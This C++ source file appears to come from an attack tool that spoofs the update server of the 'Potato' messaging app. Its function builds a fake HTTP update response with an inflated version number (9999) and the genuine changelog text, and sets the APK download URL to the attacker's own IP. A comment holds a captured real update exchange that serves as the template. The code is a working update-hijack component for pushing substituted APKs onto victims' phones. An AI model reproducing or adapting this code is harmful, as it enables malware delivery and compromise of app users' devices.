


#include "potato.h"
#include "..\\attacker.h"
#include "../version.h"
#include "../HttpUtils.h"



int Potato::prepareRespData(unsigned long ulIP, string filepath, string filename) {

	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	int ver = 9999;

	char * lpRespContentFormat =
		"{"
		"\"version\": \"%u\","
		"\"des\" : \" 1. We redesigned the appearance of the settings interface to make it look cleaner!\n 2. Now, you can send a digital currency Red Packet to your friends or in a group chat. Let's compare it with luck!\n 3. Fix known bugs. \","
		"\"url\": \"http://%s/%s\""
		"}";

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;


	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		ver, szip.c_str(), filename.c_str());

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);

	return m_filesize;
}


/*
GET /android/version.json HTTP/1.1
Host: update.iwant.im
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/3.8.0

HTTP/1.1 200 
Server: nginx
Date: Mon, 18 Feb 2019 07:41:32 GMT
Content-Type: application/json
Content-Length: 325
Connection: keep-alive
Accept-Ranges: bytes
ETag: W/"325-1549204825000"
Last-Modified: Sun, 03 Feb 2019 14:40:25 GMT

{
    "version": "1228",
    "des" : " 1. We redesigned the appearance of the settings interface to make it look cleaner!\n 2. Now, you can send a digital currency Red Packet to your friends or in a group chat. Let's compare it with luck!\n 3. Fix known bugs. ",
    "url": "http://update.iwant.im/android/potato.apk"
}
*/